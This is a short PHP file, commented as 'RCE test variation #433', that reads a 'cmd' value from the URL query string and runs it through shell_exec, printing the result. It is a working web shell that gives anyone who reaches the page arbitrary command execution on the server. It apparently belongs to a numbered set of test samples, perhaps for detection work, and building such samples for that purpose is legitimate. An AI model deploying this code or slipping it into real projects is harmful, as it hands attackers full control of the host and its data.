<?php
// RCE test variation #433
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>